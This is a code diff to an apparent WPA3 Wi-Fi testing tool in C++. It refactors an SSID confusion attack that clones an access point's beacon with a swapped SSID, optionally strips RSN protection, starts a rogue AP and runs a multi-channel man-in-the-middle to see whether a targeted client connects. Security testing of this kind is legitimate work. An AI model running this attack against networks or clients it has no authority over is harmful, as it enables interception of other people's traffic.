@@ -5,7 +5,6 @@
 #include <tins/tins.h>
 
 #include "attacks/by_target/scan_AP.h"
-#include "attacks/components/setup_connections.h"
 #include "attacks/mc_mitm/mc_mitm.h"
 #include "attacks/mc_mitm/wifi_util.h"
 #include "config/RunStatus.h"
@@ -16,10 +15,7 @@ using namespace Tins;
 using namespace chrono;
 
 namespace wpa3_tester::ssid_confusion {
-
-    // Clone the real AP beacon, replacing SSID and optionally stripping the RSN IE.
-    // Stripping RSN makes the rogue network appear open — the client's protected-management
-    // frames / 4-way handshake verification is bypassed, revealing the SSID confusion gap.
+    
     static unique_ptr<Dot11Beacon> make_confused_beacon(
         const Dot11Beacon& real,
         const string& confused_ssid,
@@ -64,22 +60,15 @@ namespace wpa3_tester::ssid_confusion {
         McMitm attack(att_real["iface"], att_rogue["iface"],
                       att_real["sniff_iface"], att_rogue["sniff_iface"],
                       real_ssid, client["mac"]);
-
-        att_real->setup_mac_addr(client["mac"]);
-        att_rogue->setup_mac_addr(ap["mac"]);
-        att_real->up_iface();
-        att_rogue->up_iface();
-        att_real->up_sniff_iface();
-        att_rogue->up_sniff_iface();
-
+        attack.setup_ifaces(att_real, client["mac"], att_rogue, ap["mac"]);
         rs.start_observers();
 
         attack.sender_real  = make_unique<PacketSender>(att_real["sniff_iface"]);
         attack.sender_rogue = make_unique<PacketSender>(att_rogue["sniff_iface"]);
 
         // Sniff only frames involving the real AP or the targeted client
-        string bpf = "(wlan addr1 "+ap["mac"]+") or (wlan addr2 "+ap["mac"]+")";
-        bpf += " or (wlan addr1 "+client["mac"]+") or (wlan addr2 "+client["mac"]+")";
+        string bpf = "(wlan addr1 "+ap["mac"]+") or (wlan addr2 "+ap["mac"]+")"
+            " or (wlan addr1 "+client["mac"]+") or (wlan addr2 "+client["mac"]+")";
         bpf = "(wlan type data or wlan type mgt) and ("+bpf+")";
 
         SnifferConfiguration cfg_real, cfg_rogue;
@@ -101,9 +90,7 @@ namespace wpa3_tester::ssid_confusion {
         // Build the rogue beacon with the confused SSID (and optionally no RSN)
         const auto confused_beacon = make_confused_beacon(*attack.beacon, confused_ssid, strip_rsn);
 
-        log(LogLevel::INFO,
-            "SSID Confusion setup: real='"+real_ssid+"' rogue='"+confused_ssid+"'"
-          +(strip_rsn ? " [RSN stripped]" : ""));
+        log(LogLevel::INFO, "SSID Confusion setup: real='"+real_ssid+"' rogue='"+confused_ssid+"'");
 
         start_ap(att_rogue["iface"], stoi(att_rogue["channel"]), confused_beacon.get());
         log(LogLevel::INFO, "Rogue AP started, waiting 1 s to initialize ...");
@@ -118,10 +105,9 @@ namespace wpa3_tester::ssid_confusion {
         // McMitm::run() sends CSA beacons continuously throughout its loop
         attack.run(timeout);
 
-        // ---- evaluate vulnerability ----
         bool vulnerable = false;
-        for (const auto& [mac, client] : attack.clients) {
-            if (client->state >= ClientState::GotMitm) {
+        for (const auto& [mac, client_entry] : attack.clients) {
+            if (client_entry->state >= ClientState::GotMitm) {
                 vulnerable = true;
                 log(LogLevel::INFO,
                     "RESULT VULNERABLE: client "+mac+" accepted rogue SSID '"+confused_ssid+
@@ -129,7 +115,6 @@ namespace wpa3_tester::ssid_confusion {
             }
         }
         if (!vulnerable)
-            log(LogLevel::INFO,
-                "RESULT NOT_VULNERABLE: no client connected to rogue SSID '"+confused_ssid+"'");
+            log(LogLevel::INFO, "RESULT NOT_VULNERABLE: no client connected to rogue SSID '"+confused_ssid+"'");
     }
 }
